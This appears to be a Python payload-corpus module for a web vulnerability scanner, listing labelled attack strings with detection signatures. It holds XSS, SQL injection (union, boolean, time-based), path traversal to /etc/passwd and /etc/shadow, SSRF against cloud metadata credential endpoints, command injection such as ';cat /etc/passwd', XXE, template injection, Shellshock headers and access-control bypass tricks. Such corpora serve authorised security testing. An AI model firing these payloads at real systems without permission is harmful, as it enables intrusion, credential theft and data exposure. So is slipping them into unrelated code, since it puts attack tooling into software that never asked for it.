"""Payload corpus for the arsenal.

Every entry is a ``(label, payload, ...)`` tuple carrying the evidence rule that
would make the payload meaningful. Payloads are chosen to be *diagnostic*: they
prove a behaviour (reflection, error, delay, fetch) rather than damage anything.
No payload here writes, deletes or executes a shell.
"""

from __future__ import annotations

# --------------------------------------------------------------------- XSS
# (label, payload, marker) - the marker must appear verbatim in the body for a
# reflection to count. A raw "alert(1)" that the server HTML-encoded is not a hit.
XSS: tuple[tuple[str, str, str], ...] = (
    ("tag-script", "<script>alert(1)</script>", "<script>alert(1)</script>"),
    ("tag-script-breakout", '"><script>alert(1)</script>', "<script>alert(1)</script>"),
    ("tag-script-single", "'><script>alert(1)</script>", "<script>alert(1)</script>"),
    ("img-onerror", "<img src=x onerror=alert(1)>", "<img src=x onerror=alert(1)>"),
    ("img-slash-onerror", "<img/src=x/onerror=alert(1)>", "onerror=alert(1)"),
    ("svg-onload", "<svg onload=alert(1)>", "<svg onload=alert(1)>"),
    ("svg-slash-onload", "<svg/onload=alert(1)>", "<svg/onload=alert(1)>"),
    ("body-onload", "<body onload=alert(1)>", "<body onload=alert(1)>"),
    ("iframe-javascript", "<iframe src=javascript:alert(1)>", "javascript:alert(1)"),
    ("details-ontoggle", "<details open ontoggle=alert(1)>", "ontoggle=alert(1)"),
    ("input-autofocus", "<input autofocus onfocus=alert(1)>", "onfocus=alert(1)"),
    ("video-onerror", "<video><source onerror=alert(1)>", "onerror=alert(1)"),
    ("marquee-onstart", "<marquee onstart=alert(1)>", "onstart=alert(1)"),
    ("a-href-javascript", '<a href="javascript:alert(1)">x</a>', "javascript:alert(1)"),
    ("attr-breakout-dq", '" onmouseover="alert(1)', 'onmouseover="alert(1)'),
    ("attr-breakout-sq", "' onmouseover='alert(1)", "onmouseover='alert(1)"),
    ("template-literal", "${alert(1)}", "${alert(1)}"),
    ("dom-hash", "#<img src=x onerror=alert(1)>", "onerror=alert(1)"),
)

# Payloads used to test reflected-vs-encoded handling in JSON responses.
XSS_JSON: tuple[tuple[str, str, str], ...] = (
    ("json-script", '"<script>alert(1)</script>"', "<script>alert(1)</script>"),
    ("json-breakout", '\\"><script>alert(1)</script>', "<script>alert(1)</script>"),
)

# --------------------------------------------------------------------- SQLi
# (label, payload, kind) where kind is error | boolean | time | union
SQLI: tuple[tuple[str, str, str], ...] = (
    ("quote", "'", "error"),
    ("double-quote", '"', "error"),
    ("quote-comment", "'--", "error"),
    ("quote-comment-space", "'-- -", "error"),
    ("quote-hash", "'#", "error"),
    ("paren", "')", "error"),
    ("or-true", "' OR '1'='1", "boolean"),
    ("or-true-numeric", "' OR 1=1-- -", "boolean"),
    ("or-true-dq", '" OR "1"="1', "boolean"),
    ("and-true", "1' AND '1'='1", "boolean"),
    ("and-false", "1' AND '1'='2", "boolean"),
    ("admin-truncate", "admin'--", "error"),
    ("union-null-1", "' UNION SELECT NULL-- -", "union"),
    ("union-null-2", "' UNION SELECT NULL,NULL-- -", "union"),
    ("union-null-3", "' UNION SELECT NULL,NULL,NULL-- -", "union"),
    ("union-null-4", "' UNION SELECT NULL,NULL,NULL,NULL-- -", "union"),
    ("union-version", "' UNION SELECT 1,@@version,3-- -", "union"),
    ("union-user", "' UNION SELECT 1,user(),3-- -", "union"),
    ("union-db", "' UNION SELECT 1,database(),3-- -", "union"),
    ("order-by-1", "' ORDER BY 1-- -", "union"),
    ("order-by-10", "' ORDER BY 10-- -", "union"),
    ("sleep-mysql", "' AND SLEEP({delay})-- -", "time"),
    ("sleep-mysql-paren", "1 AND (SELECT 1 FROM (SELECT SLEEP({delay}))a)", "time"),
    ("sleep-pg", "';SELECT pg_sleep({delay})-- -", "time"),
    ("sleep-mssql", "1);WAITFOR DELAY '0:0:{delay}'--", "time"),
    ("sleep-oracle", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--", "time"),
    ("sleep-sqlite", "' AND 1=randomblob(100000000)--", "time"),
    ("extractvalue", "' AND extractvalue(1,concat(0x7e,version()))-- -", "error"),
    ("updatexml", "' AND updatexml(1,concat(0x7e,version()),1)-- -", "error"),
    ("cast-error", "' AND 1=CAST((SELECT version()) AS int)-- -", "error"),
    ("numeric-or", "1 OR 1=1", "boolean"),
    ("numeric-and-false", "1 AND 1=2", "boolean"),
    ("stacked", "'; SELECT 1-- -", "error"),
)

SQL_ERROR_SIGNATURES: tuple[str, ...] = (
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"valid MySQL result",
    r"MySqlClient\.",
    r"PostgreSQL.*ERROR",
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"Warning.*pg_",
    r"valid PostgreSQL result",
    r"ORA-\d{4,5}",
    r"Oracle error",
    r"quoted string not properly terminated",
    r"Microsoft OLE DB Provider for ODBC Drivers",
    r"Microsoft SQL Native Client error",
    r"ODBC SQL Server Driver",
    r"SQLServer JDBC Driver",
    r"Unclosed quotation mark after the character string",
    r"Incorrect syntax near",
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    r"sqlite3\.OperationalError",
    r"near \".*\": syntax error",
    r"Syntax error.*in query expression",
    r"Data type mismatch in criteria expression",
    r"\[SQL Server\]",
    r"com\.mysql\.jdbc",
    r"org\.postgresql\.util\.PSQLException",
    r"you have an error in your sql syntax",
    r"division by zero",
)

# ---------------------------------------------------------------------- LFI
# (label, payload, signature regex)
LFI: tuple[tuple[str, str, str], ...] = (
    ("etc-passwd", "../../../../etc/passwd", r"root:.*:0:0:"),
    ("etc-passwd-encoded", "..%2f..%2f..%2f..%2fetc%2fpasswd", r"root:.*:0:0:"),
    ("etc-passwd-double", "..%252f..%252f..%252f..%252fetc%252fpasswd", r"root:.*:0:0:"),
    ("etc-passwd-filter", "....//....//....//....//etc/passwd", r"root:.*:0:0:"),
    ("etc-passwd-abs", "/etc/passwd", r"root:.*:0:0:"),
    ("etc-passwd-null", "/etc/passwd%00", r"root:.*:0:0:"),
    ("etc-passwd-null-jpg", "/etc/passwd%00.jpg", r"root:.*:0:0:"),
    ("etc-passwd-utf8", "..%c0%af..%c0%af..%c0%afetc/passwd", r"root:.*:0:0:"),
    ("etc-passwd-double-slash", "//etc/passwd", r"root:.*:0:0:"),
    ("etc-passwd-triple-slash", "///etc/passwd", r"root:.*:0:0:"),
    ("etc-shadow", "../../../../etc/shadow", r"root:.*:\$"),
    ("etc-hosts", "../../../../etc/hosts", r"localhost"),
    ("win-ini", "../../../../windows/win.ini", r"\[extensions\]"),
    ("win-ini-backslash", "..\\..\\..\\..\\windows\\win.ini", r"\[extensions\]"),
    ("win-ini-abs", "C:\\Windows\\win.ini", r"\[extensions\]"),
    ("boot-ini", "../../../../boot.ini", r"\[boot loader\]"),
    ("proc-environ", "/proc/self/environ", r"(PATH=|HTTP_|DOCUMENT_ROOT)"),
    ("proc-cmdline", "/proc/self/cmdline", r"(/bin/|python|node|java)"),
    ("proc-self-status", "/proc/self/status", r"Name:\s"),
    ("apache-log", "/var/log/apache2/access.log", r"(GET|POST) /"),
    ("nginx-log", "/var/log/nginx/access.log", r"(GET|POST) /"),
    ("auth-log", "/var/log/auth.log", r"(sshd|sudo)"),
    ("php-filter-index", "php://filter/convert.base64-encode/resource=index.php", r"[A-Za-z0-9+/]{40,}={0,2}"),
    ("php-filter-config", "php://filter/convert.base64-encode/resource=../config.php", r"[A-Za-z0-9+/]{40,}={0,2}"),
    ("php-filter-read", "php://filter/read=convert.base64-encode/resource=/etc/passwd", r"[A-Za-z0-9+/]{40,}={0,2}"),
    ("file-scheme", "file:///etc/passwd", r"root:.*:0:0:"),
    ("compress-zlib", "compress.zlib:///etc/passwd", r"root:.*:0:0:"),
    ("data-scheme", "data://text/plain,<?php phpinfo();?>", r"PHP Version"),
    ("expect-scheme", "expect://id", r"uid=\d+"),
    ("glob-scheme", "glob:///etc/*", r"(?m)^/etc/(passwd|hosts|group|shadow)$"),
)

# --------------------------------------------------------------------- SSRF
# (label, url, signature regex)
SSRF: tuple[tuple[str, str, str], ...] = (
    ("loopback", "http://127.0.0.1:80", r"(<!doctype|<html|Apache|nginx|Connection refused)"),
    ("loopback-22", "http://127.0.0.1:22", r"(SSH-2\.0|Connection refused)"),
    ("localhost", "http://localhost:80", r"(<!doctype|<html|Connection refused)"),
    ("localhost-8080", "http://localhost:8080", r"(<!doctype|<html|Connection refused)"),
    ("zero-address", "http://0.0.0.0:80", r"(<!doctype|<html|Connection refused)"),
    ("ipv6-loopback", "http://[::1]:80", r"(<!doctype|<html|Connection refused)"),
    ("short-loopback", "http://127.1", r"(<!doctype|<html|Connection refused)"),
    ("decimal-loopback", "http://2130706433:80", r"(<!doctype|<html|Connection refused)"),
    ("hex-loopback", "http://0x7f000001:80", r"(<!doctype|<html|Connection refused)"),
    ("octal-loopback", "http://0177.0.0.1:80", r"(<!doctype|<html|Connection refused)"),
    ("nip-io", "http://127.0.0.1.nip.io", r"(<!doctype|<html|Connection refused)"),
    ("localtest", "http://localtest.me", r"(<!doctype|<html|Connection refused)"),
    ("aws-metadata", "http://169.254.169.254/latest/meta-data/", r"(ami-|instance-id|iam/|security-credentials)"),
    ("aws-iam", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", r"(AccessKeyId|security-credentials|ami-)"),
    ("gcp-metadata", "http://metadata.google.internal/computeMetadata/v1/", r"(project|instance|service-accounts)"),
    ("alibaba-metadata", "http://100.100.100.200/latest/meta-data/", r"(instance-id|region|image-id)"),
    ("azure-metadata", "http://192.0.0.192/latest/meta-data/", r"(instance|vmId|subscription)"),
    ("digitalocean", "http://169.254.169.254/metadata/v1/", r"(droplet_id|hostname|region)"),
    ("file-scheme", "file:///etc/passwd", r"root:.*:0:0:"),
    ("gopher-redis", "gopher://127.0.0.1:6379/_INFO", r"(redis_version|role:)"),
    ("dict-memcached", "dict://127.0.0.1:11211/stat", r"(STAT |memcached)"),
    ("userinfo-bypass", "http://127.0.0.1:80@evil.example", r"(<!doctype|<html)"),
    ("fragment-bypass", "http://evil.example#@127.0.0.1", r"(<!doctype|<html)"),
    ("private-10", "http://10.0.0.1", r"(<!doctype|<html|Connection refused)"),
    ("private-192", "http://192.168.0.1", r"(<!doctype|<html|Connection refused)"),
    ("private-172", "http://172.16.0.1", r"(<!doctype|<html|Connection refused)"),
)

# ----------------------------------------------------------- open redirect
REDIRECT: tuple[tuple[str, str], ...] = (
    ("absolute-https", "https://evil.example/"),
    ("absolute-http", "http://evil.example/"),
    ("protocol-relative", "//evil.example/"),
    ("triple-slash", "///evil.example/"),
    ("scheme-only", "https:evil.example"),
    ("single-slash-scheme", "https:/evil.example"),
    ("backslash", "\\evil.example"),
    ("slash-backslash", "/\\evil.example"),
    ("encoded-slash", "%2F%2Fevil.example"),
    ("encoded-tab", "%09//evil.example"),
    ("encoded-cr", "%0d//evil.example"),
    ("encoded-lf", "%0a//evil.example"),
    ("suffix-domain", "https://target.evil.example"),
    ("at-sign", "https://target@evil.example"),
    ("javascript", "javascript:alert(1)"),
    ("data-uri", "data:text/html,<script>alert(1)</script>"),
    ("path-relative", "/..//evil.example"),
    ("double-encoded", "%252F%252Fevil.example"),
)

# -------------------------------------------------------- command injection
# (label, payload, sleep_seconds_or_None)
CMDI: tuple[tuple[str, str, int | None], ...] = (
    ("semicolon", ";sleep {delay}", 5),
    ("pipe", "|sleep {delay}", 5),
    ("and", "&&sleep {delay}", 5),
    ("or", "||sleep {delay}", 5),
    ("backtick", "`sleep {delay}`", 5),
    ("dollar-paren", "$(sleep {delay})", 5),
    ("newline", "%0asleep {delay}", 5),
    ("encoded-semicolon", "%3Bsleep%20{delay}", 5),
    ("encoded-pipe", "%7Csleep%20{delay}", 5),
    ("semicolon-id", ";id", None),
    ("pipe-id", "|id", None),
    ("dollar-id", "$(id)", None),
    ("backtick-id", "`id`", None),
    ("and-id", "&&id", None),
    ("semicolon-whoami", ";whoami", None),
    ("semicolon-passwd", ";cat /etc/passwd", None),
    ("semicolon-uname", ";uname -a", None),
    ("win-ping", "& ping -n {delay} 127.0.0.1", 5),
)

CMDI_SIGNATURES: tuple[str, ...] = (
    r"uid=\d+\([^)]+\)\s+gid=\d+",
    r"root:.*:0:0:",
    r"Linux \S+ \d+\.\d+",
    r"Microsoft Windows \[Version",
    r"nt authority\\system",
)

# ------------------------------------------------------------ host headers
HOST_HEADERS: tuple[str, ...] = (
    "Host",
    "X-Forwarded-Host",
    "X-Forwarded-Server",
    "X-Host",
    "X-Original-Host",
    "X-Rewrite-URL",
    "X-Original-URL",
    "X-Forwarded-For",
    "X-Forwarded",
    "Forwarded",
    "X-Real-IP",
    "X-Client-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Originating-IP",
    "Client-IP",
    "True-Client-IP",
    "CF-Connecting-IP",
    "Fastly-Client-IP",
    "X-Cluster-Client-IP",
    "X-ProxyUser-Ip",
    "X-Forwarded-Prefix",
    "X-HTTP-Method-Override",
    "X-Method-Override",
    "X-Custom-IP-Authorization",
    "X-Forwarded-Scheme",
)

# -------------------------------------------------------------- CRLF / header
CRLF: tuple[tuple[str, str], ...] = (
    ("crlf-basic", "%0d%0aInjected-Header: zs"),
    ("crlf-lf-only", "%0aInjected-Header: zs"),
    ("crlf-double-encoded", "%250d%250aInjected-Header: zs"),
    ("crlf-unicode", "%E5%98%8A%E5%98%8DInjected-Header: zs"),
    ("crlf-response-split", "%0d%0a%0d%0a<html>zs-canary</html>"),
)

# ------------------------------------------------------------ NoSQL / other
NOSQL: tuple[tuple[str, str, str], ...] = (
    ("mongo-ne", '{"$ne": null}', "json"),
    ("mongo-gt", '{"$gt": ""}', "json"),
    ("mongo-regex", '{"$regex": "^.*$"}', "json"),
    ("mongo-where", '{"$where": "1==1"}', "json"),
    ("mongo-in", '{"$in": ["admin"]}', "json"),
    ("mongo-array", "username[$ne]=admin&password[$ne]=x", "form"),
    ("mongo-bracket-gt", "username[$gt]=&password[$gt]=", "form"),
)

SSTI: tuple[tuple[str, str, str], ...] = (
    ("jinja-math", "{{7*7}}", "49"),
    ("jinja-config", "{{7*'7'}}", "7777777"),
    ("freemarker", "${7*7}", "49"),
    ("velocity", "#set($x=7*7)$x", "49"),
    ("smarty", "{7*7}", "49"),
    ("erb", "<%= 7*7 %>", "49"),
    ("twig", "{{7*7}}", "49"),
    ("spring", "*{7*7}", "49"),
    ("jsp-el", "${7*7}", "49"),
    ("handlebars", "{{#with \"zspti\" as |string|}}{{string}}{{/with}}", "zspti"),
)

XXE_PAYLOADS: tuple[tuple[str, str, str], ...] = (
    (
        "file-entity",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
        r"root:.*:0:0:",
    ),
    (
        "parameter-entity",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://127.0.0.1:1/"> %p;]><r/>',
        r"(error|failed|refused)",
    ),
    (
        "expect-entity",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "expect://id">]><r>&x;</r>',
        r"uid=\d+",
    ),
)

# ------------------------------------------------------- access-control bypass
BYPASS_PATHS: tuple[tuple[str, str], ...] = (
    ("trailing-slash", "/{path}/"),
    ("double-slash", "//{path}"),
    ("dot-segment", "/./{path}"),
    ("dot-dot-segment", "/x/../{path}"),
    ("encoded-slash", "/%2f{path}"),
    ("encoded-slash-trailing", "/{path}%2f"),
    ("semicolon", "/{path};/"),
    ("semicolon-json", "/{path};.json"),
    ("dot-extension", "/{path}."),
    ("case-upper", "/{upper}"),
    ("case-mixed", "/{mixed}"),
    ("percent-encode-char", "/{encoded}"),
    ("path-parameter", "/{path}%00"),
    ("double-encoded-slash", "/%252f{path}"),
)

BYPASS_HEADERS: tuple[tuple[str, str], ...] = (
    ("x-forwarded-for", "X-Forwarded-For: 127.0.0.1"),
    ("x-real-ip", "X-Real-IP: 127.0.0.1"),
    ("x-client-ip", "X-Client-IP: 127.0.0.1"),
    ("x-originating-ip", "X-Originating-IP: 127.0.0.1"),
    ("x-remote-ip", "X-Remote-IP: 127.0.0.1"),
    ("x-custom-ip", "X-Custom-IP-Authorization: 127.0.0.1"),
    ("forwarded", "Forwarded: for=127.0.0.1"),
    ("x-original-url", "X-Original-URL: /{path}"),
    ("x-rewrite-url", "X-Rewrite-URL: /{path}"),
    ("x-forwarded-prefix", "X-Forwarded-Prefix: /{path}"),
    ("x-host", "X-Host: 127.0.0.1"),
    ("referer-local", "Referer: http://127.0.0.1/{path}"),
)

# ------------------------------------------------------------------- misc
SHELLSHOCK_HEADERS: tuple[tuple[str, str], ...] = (
    ("user-agent", "User-Agent: () { :; }; echo; echo zs-canary"),
    ("referer", "Referer: () { :; }; echo; echo zs-canary"),
    ("cookie", "Cookie: () { :; }; echo; echo zs-canary"),
    ("x-header", "X-Api-Version: () { :; }; echo; echo zs-canary"),
)

DESERIALIZATION_MARKERS: tuple[str, ...] = (
    r"rO0AB",            # Java serialised stream (base64)
    r"aced0005",         # Java serialised stream (hex)
    r"O:\d+:\"",         # PHP object
    r"a:\d+:\{",         # PHP array
    r"__VIEWSTATE",      # ASP.NET ViewState
    r"AAEAAAD/////",     # .NET BinaryFormatter
    r"gASV",             # Python pickle (base64)
)

INTERESTING_PARAMS: tuple[str, ...] = (
    "id", "user", "user_id", "uid", "account", "account_id", "profile", "member",
    "page", "file", "filename", "path", "dir", "folder", "doc", "document", "template",
    "url", "uri", "link", "redirect", "redirect_uri", "next", "return", "returnUrl",
    "goto", "target", "dest", "destination", "continue", "callback", "ref", "image",
    "img", "src", "source", "host", "domain", "ip", "addr", "address", "server",
    "cmd", "exec", "command", "run", "shell", "ping", "query", "search", "q", "s",
    "keyword", "term", "filter", "sort", "order", "orderby", "by", "limit", "offset",
    "start", "end", "from", "to", "date", "lang", "locale", "format", "view", "mode",
    "type", "action", "do", "op", "operation", "method", "func", "function", "api",
    "api_key", "apikey", "key", "token", "auth", "access_token", "session", "sid",
    "jwt", "debug", "test", "admin", "role", "permission", "scope", "email", "name",
    "username", "password", "pass", "pwd", "code", "coupon", "price", "amount", "qty",
    "quantity", "count", "num", "number", "index", "section", "module", "component",
    "tab", "step", "report", "export", "import", "download", "upload", "read", "write",
    "load", "include", "require", "page_id", "post", "post_id", "article", "article_id",
    "category", "cat", "tag", "product", "product_id", "item", "item_id", "order_id",
    "invoice", "invoice_id", "receipt", "transaction", "payment", "card", "customer",
    "company", "org", "organization", "tenant", "workspace", "project", "repo",
    "branch", "commit", "issue", "ticket", "thread", "message", "comment", "reply",
    "content", "body", "text", "title", "subject", "description", "note", "notes",
    "status", "state", "enabled", "active", "visible", "public", "private", "secret",
    "verify", "confirm", "reset", "recover", "otp", "mfa", "2fa", "captcha",
    "webhook", "hook", "notify", "notification", "subscribe", "unsubscribe", "email_id",
    "lat", "lng", "zoom", "map", "location", "city", "country", "region", "currency",
    "discount", "shipping", "billing", "address_id", "phone", "mobile", "fax",
    "ip_address", "user_agent", "referer", "origin", "return_to", "success_url",
    "fail_url", "cancel_url", "callback_url", "webhook_url", "proxy", "target_url",
    "feed", "rss", "xml", "json", "csv", "pdf", "print", "preview", "thumb",
    "thumbnail", "avatar", "logo", "banner", "media", "asset", "attachment", "attach",
    "log", "logs", "audit", "event", "events", "metric", "metrics", "stats",
    "statistics", "analytics", "chart", "graph", "dashboard", "widget", "plugin",
    "theme", "style", "css", "js", "script", "resource", "static", "cdn", "proxy_url",
    "ws", "socket", "channel", "room", "stream", "playlist", "video", "audio",
    "album", "photo", "gallery", "share", "link_id", "short", "slug", "permalink",
    "alias", "route", "handler", "controller", "service", "endpoint", "version",
    "v", "ver", "build", "env", "environment", "stage", "tenant_id", "org_id",
    "app", "application", "client", "client_id", "device", "device_id", "platform",
)
